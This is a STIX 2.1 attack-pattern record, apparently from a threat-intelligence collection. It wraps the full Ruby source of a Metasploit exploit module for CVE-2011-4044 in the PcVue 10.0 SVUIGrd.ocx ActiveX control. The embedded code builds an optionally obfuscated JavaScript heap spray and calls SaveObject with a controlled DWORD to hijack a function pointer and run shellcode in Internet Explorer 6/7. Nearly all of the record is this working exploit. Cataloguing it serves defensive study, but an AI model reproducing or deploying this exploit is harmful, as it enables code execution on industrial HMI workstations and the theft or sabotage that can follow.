{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dafe409c-e22c-4926-8019-13682008085f",
    "created": "2024-08-14T16:43:18.270983Z",
    "modified": "2024-08-14T16:43:18.270987Z",
    "name": "\"PcVue 10.0 SV.UIGrdCtrl.1 LoadObject()/SaveObject() Trusted DWORD Vulnerability\"",
    "description": " This module exploits a function pointer control within SVUIGrd.ocx of PcVue 10.0. By setting a dword value for the SaveObject() or LoadObject(), an attacker can overwrite a function pointer and execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/pcvue_func.rb",
            "external_id": "pcvue_func.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4044"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/pcvue_1-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"PcVue 10.0 SV.UIGrdCtrl.1 'LoadObject()/SaveObject()' Trusted DWORD Vulnerability\",\n      'Description'    => %q{\n        This module exploits a function pointer control within SVUIGrd.ocx of PcVue 10.0.\n        By setting a dword value for the SaveObject() or LoadObject(), an attacker can\n        overwrite a function pointer and execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', # original find\n          'mr_me <steventhomasseeley[at]gmail.com>',  # msf module\n          'TecR0c <roccogiovannicalvi[at]gmail.com >',# msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-4044' ],\n          [ 'OSVDB', '77561' ],\n          [ 'BID', '49795' ],\n          [ 'URL', 'http://aluigi.altervista.org/adv/pcvue_1-adv.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'           => 1024,\n          'BadChars'        => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            #IE 6/7 on Widnows XP and Vista\n            'Internet Explorer 6 / Internet Explorer 7',\n            {\n              'Ret'    => 0x0a0a0a0a,\n              'Offset' => 1000\n            }\n          ]\n        ],\n      'DisclosureDate' => '2011-10-05',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.',  'msf.html']),\n          OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]),\n        ])\n  end\n\n  def on_request_uri(cli, request)\n\n    #If not IE, we don't continue\n    agent = request.headers['User-Agent']\n    if agent !~ /MSIE [6|7]\\.0/\n      print_error(\"Target not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops      = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret       = \"0x%08x\" % target.ret\n\n    blocksize = 0x50000\n    fillto    = 200\n\n    # Randomize the javascript variable names\n    obj_name     = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    j_txt        = rand_text_alpha(rand(8) + 4)\n    randnop      = rand_text_alpha(rand(100) + 1)\n\n    js = <<-EOS\nvar #{j_shellcode} = unescape('#{shellcode}');\nvar #{randnop} = \"#{nops}\";\nvar #{j_nops} = unescape(#{randnop});\nvar #{j_headersize} = 20;\nvar #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;\nwhile(#{j_nops}.length < #{j_slackspace}) {\n  #{j_nops} += #{j_nops};\n}\nvar #{j_fillblock} = #{j_nops}.substring(0, #{j_slackspace});\nvar #{j_block} = #{j_nops}.substring(0, #{j_nops}.length - #{j_slackspace});\nwhile((#{j_block}.length + #{j_slackspace}) < #{blocksize}) {\n  #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};\n}\n\n#{j_memory} = new Array();\nfor(#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++){\n  #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode} ;\n}\n\nfunction main(){\n  #{obj_name}.SaveObject(\"#{j_txt}.txt\", #{ret}, 0);\n}\nEOS\n\n    js = js.gsub(/^ {4}/, '')\n\n    #JS obfuscation on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n      main_sym = js.sym('main')\n    else\n      main_sym = \"main\"\n    end\n\n    content = <<-EOS\n<html>\n<body>\n<object classid='clsid:2BBD45A5-28AE-11D1-ACAC-0800170967D9' id='#{obj_name}' ></object>\n<script language='javascript'>\n#{js}\n#{main_sym}();\n</script>\n</body>\n</html>\nEOS\n\n    #Remove the extra tabs from content\n    content = content.gsub(/^ {4}/, '')\n\n    print_status(\"Sending #{self.name}\")\n    send_response(cli, content, {'Content-Type'=>'text/html'})\n  end\nend\n\n\n=begin\nTested successfully on the following platforms:\n - PcVue 10.0 (SVUIGrd.ocx v1.5.1.0) on Internet Explorer 6 & 7, Windows XP SP3\n\nClass SVUIGrdCtrl\nProgID: SV.UIGrdCtrl.1\nGUID: {2BBD45A5-28AE-11D1-ACAC-0800170967D9}\nNumber of Interfaces: 1\nDefault Interface: ISVUIGrd\nRegKey Safe for Script: False\nRegkeySafe for Init: False\nKillBitSet: False\n=end\n",
    "x_mitre_disclosure_date": "2011-10-05",
    "x_mitre_platforms": [
        "win'"
    ]
}